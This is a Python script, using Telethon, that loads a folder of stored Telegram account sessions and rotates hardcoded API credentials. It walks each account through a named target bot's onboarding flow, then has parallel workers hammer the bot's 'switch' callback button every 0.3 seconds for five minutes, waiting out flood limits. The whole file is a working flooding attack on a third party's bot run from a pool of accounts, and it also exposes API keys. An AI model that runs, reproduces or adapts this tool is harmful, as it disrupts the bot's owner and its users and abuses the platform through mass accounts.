"""
berlin_stress.py
Флоу: /start → вступить в канал → я подписался → Поддержка → спам кнопкой «переключить»
"""

import asyncio
import os
import random
import re

from telethon import TelegramClient
from telethon.errors import FloodWaitError, AuthKeyDuplicatedError
from telethon.tl.functions.messages import (
    GetBotCallbackAnswerRequest, SendMessageRequest, ImportChatInviteRequest
)
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.types import ReplyInlineMarkup, KeyboardButtonCallback, KeyboardButtonUrl

API = [
    '24565698:5a084b434f8505ace703485b9da85040',
    '27904162:e7cba879b1c643ba77490bf328df5eab',
    '23037915:50f06f5b2223586fde0d1379ea91ebc7',
    '29512095:0b29a7d42fff002856b9bed64f7ec919',
    '25055016:25edf5b7becebe91a2d61fe8d9d9931b',
    '21156147:90408de329b27f7dd411dff3e601acc6',
]

SESSION_DIR  = 'sessions'
TARGET_BOT   = 'berlinsnoserbot'
SPAM_DELAY   = 0.3
SPAM_WORKERS = 5
SPAM_MINUTES = 5


def _get_sessions(limit: int = SPAM_WORKERS) -> list[str]:
    sessions = [f.replace('.session', '') for f in os.listdir(SESSION_DIR) if f.endswith('.session')]
    random.shuffle(sessions)
    return sessions[:limit]


def _make_client(session: str) -> TelegramClient:
    api_str = random.choice(API)
    api_id, api_hash = api_str.split(':', 1)
    return TelegramClient(
        f"./{SESSION_DIR}/{session}", int(api_id), api_hash,
        system_version='4.16.30-vxCUSTOM'
    )


def _find_inline_btn(msgs, fragment: str) -> tuple[int, bytes] | None:
    """Ищет inline-кнопку по фрагменту текста во всех сообщениях."""
    for msg in msgs:
        if msg.out or not msg.reply_markup:
            continue
        if not isinstance(msg.reply_markup, ReplyInlineMarkup):
            continue
        for row in msg.reply_markup.rows:
            for btn in row.buttons:
                if isinstance(btn, KeyboardButtonCallback) and fragment.lower() in btn.text.lower():
                    return msg.id, btn.data
    return None


async def _prepare_session(session: str) -> tuple[TelegramClient, int, bytes] | None:
    """
    Полный флоу: /start → вступить в канал → я подписался → Поддержка → найти кнопку переключить.
    Возвращает (client, msg_id, btn_data) для кнопки переключить, или None при ошибке.
    """
    client = _make_client(session)
    try:
        await asyncio.wait_for(client.connect(), timeout=12)
        if not await client.is_user_authorized():
            print(f"[BERLIN] [{session}] невалид", flush=True)
            await client.disconnect()
            return None

        peer = await client.get_entity(TARGET_BOT)

        # ── Шаг 1: /start ──────────────────────────────────────────────────
        await client(SendMessageRequest(peer=peer, message='/start', random_id=random.randint(1, 2**31)))
        await asyncio.sleep(2)

        msgs = await client.get_messages(peer, limit=5)

        # ── Шаг 2: вступить в канал по URL-кнопке ──────────────────────────
        for msg in msgs:
            if msg.out or not msg.reply_markup:
                continue
            if not isinstance(msg.reply_markup, ReplyInlineMarkup):
                continue
            for row in msg.reply_markup.rows:
                for btn in row.buttons:
                    if isinstance(btn, KeyboardButtonUrl):
                        url = btn.url
                        m = re.search(r't\.me/(?:joinchat/|\+)?([A-Za-z0-9_\-]+)', url)
                        if m:
                            chan_ref = m.group(1)
                            try:
                                if '+' in url or 'joinchat' in url:
                                    await client(ImportChatInviteRequest(hash=chan_ref))
                                else:
                                    chan_ent = await client.get_entity(chan_ref)
                                    await client(JoinChannelRequest(chan_ent))
                                print(f"[BERLIN] [{session}] ✅ вступил в канал {chan_ref}", flush=True)
                            except Exception as e:
                                print(f"[BERLIN] [{session}] канал ({str(e)[:50]})", flush=True)
                            await asyncio.sleep(1.5)

        # ── Шаг 3: нажать «я подписался» ───────────────────────────────────
        msgs = await client.get_messages(peer, limit=5)
        result = _find_inline_btn(msgs, 'подписал')
        if not result:
            print(f"[BERLIN] [{session}] ❌ кнопка 'я подписался' не найдена", flush=True)
            await client.disconnect()
            return None

        sub_msg_id, sub_data = result
        await client(GetBotCallbackAnswerRequest(peer=peer, msg_id=sub_msg_id, data=sub_data))
        await asyncio.sleep(2)

        # ── Шаг 4: нажать inline-кнопку «Поддержка» ────────────────────────
        msgs = await client.get_messages(peer, limit=5)
        result = _find_inline_btn(msgs, 'Поддержка')
        if not result:
            print(f"[BERLIN] [{session}] ❌ кнопка 'Поддержка' не найдена", flush=True)
            await client.disconnect()
            return None
        supp_msg_id, supp_data = result
        await client(GetBotCallbackAnswerRequest(peer=peer, msg_id=supp_msg_id, data=supp_data))
        await asyncio.sleep(2)

        # ── Шаг 5: найти кнопку «переключить» ──────────────────────────────
        msgs = await client.get_messages(peer, limit=5)
        result = _find_inline_btn(msgs, 'переключить')
        if not result:
            print(f"[BERLIN] [{session}] ❌ кнопка 'переключить' не найдена", flush=True)
            await client.disconnect()
            return None

        switch_msg_id, switch_data = result
        print(f"[BERLIN] [{session}] ✅ готов, msg_id={switch_msg_id}", flush=True)
        return client, switch_msg_id, switch_data

    except AuthKeyDuplicatedError:
        print(f"[BERLIN] [{session}] занят другим процессом", flush=True)
        try:
            await client.disconnect()
        except Exception:
            pass
        return None
    except Exception as e:
        print(f"[BERLIN] [{session}] ошибка подготовки: {e}", flush=True)
        try:
            await client.disconnect()
        except Exception:
            pass
        return None


async def _spam_worker(client: TelegramClient, session: str,
                       msg_id: int, btn_data: bytes,
                       stop_event: asyncio.Event) -> int:
    """Спамит кнопкой 'переключить' пока не истечёт время."""
    count = 0
    try:
        peer = await client.get_entity(TARGET_BOT)
        print(f"[BERLIN] [{session}] 🔥 спам кнопки переключить", flush=True)

        while not stop_event.is_set():
            try:
                await client(GetBotCallbackAnswerRequest(peer=peer, msg_id=msg_id, data=btn_data))
                count += 1
                if count % 50 == 0:
                    print(f"[BERLIN] [{session}] 📊 {count} нажатий", flush=True)
            except FloodWaitError as e:
                print(f"[BERLIN] [{session}] 🌊 flood {e.seconds}s", flush=True)
                await asyncio.sleep(e.seconds)
            except Exception as e:
                print(f"[BERLIN] [{session}] ⚠️ {str(e)[:60]}", flush=True)
                await asyncio.sleep(1)
            await asyncio.sleep(SPAM_DELAY)

    except Exception as e:
        print(f"[BERLIN] [{session}] ❌ воркер упал: {e}", flush=True)
    finally:
        try:
            if client.is_connected():
                await client.disconnect()
        except Exception:
            pass

    print(f"[BERLIN] [{session}] 🏁 итог: {count} нажатий", flush=True)
    return count


async def run_berlin_stress(notify_fn=None, user_id: int = 0) -> bool:
    async def notify(text: str):
        if notify_fn:
            try:
                await notify_fn(text)
            except Exception:
                pass
        print(f"[BERLIN] {text}", flush=True)

    sessions = _get_sessions(SPAM_WORKERS)
    if not sessions:
        await notify("❌ Нет сессий в папке sessions/")
        return False

    await notify(f"🔄 Подготовка {len(sessions)} сессий...")

    prep_results = await asyncio.gather(
        *[_prepare_session(s) for s in sessions],
        return_exceptions=True
    )

    ready = []
    for i, r in enumerate(prep_results):
        if isinstance(r, tuple) and len(r) == 3:
            ready.append((sessions[i], r[0], r[1], r[2]))

    if not ready:
        await notify("❌ Ни одна сессия не прошла флоу. Проверьте сессии.")
        return False

    await notify(
        f"✅ Готово {len(ready)} из {len(sessions)} сессий\n"
        f"⚡️ Спам кнопкой *переключить* · {SPAM_DELAY}s · {SPAM_MINUTES} мин"
    )

    stop_event = asyncio.Event()
    asyncio.get_event_loop().call_later(SPAM_MINUTES * 60, stop_event.set)

    tasks = [
        asyncio.create_task(_spam_worker(c, s, mid, bdata, stop_event))
        for s, c, mid, bdata in ready
    ]

    results = await asyncio.gather(*tasks, return_exceptions=True)
    total = sum(r for r in results if isinstance(r, int))

    await notify(
        f"🏁 Готово!\n"
        f"📊 Итого: *{total}* нажатий за {SPAM_MINUTES} мин\n"
        f"👥 Сессий: {len(ready)}"
    )
    return True
